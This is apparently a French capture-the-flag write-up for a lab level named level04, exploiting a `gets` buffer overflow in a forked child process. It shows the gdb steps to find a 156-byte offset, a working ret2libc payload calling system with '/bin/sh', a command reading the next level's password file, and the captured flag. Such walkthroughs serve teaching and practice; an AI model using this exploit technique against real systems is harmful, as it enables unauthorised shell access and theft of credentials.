1. Le programme fork, le parent va rentrer dans la boucle infinie, et l'enfant dans la premiere condition. L'utilisation de la fonction `gets` creer une vulnerabilite que l'on peut exploiter.

2. On passe gdb en mode follow-child avec la commande `set follow-fork-mode child`.

3. Obtention de l'offset
   ```
   (gdb) r < <(echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
   [...]
   0x41326641 in ?? ()
   ```
   > Offset de 156

4. Etant donne que l'on ne peut pas faire de syscall on va utiliser la methode `RET2LIBC`.

   ```
   # Addresse de system
   (gdb) info function system
   [...]
   0xf7e6aed0  system

   # Addresse d'exit
   (gdb) info function exit
   [...]
   0xf7e5eb70  exit

   # Addresse de "/bin/sh"
   (gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
   0xf7f897ec
   ```

```
(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04

cat /home/users/level05/.pass
```
> Flag: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
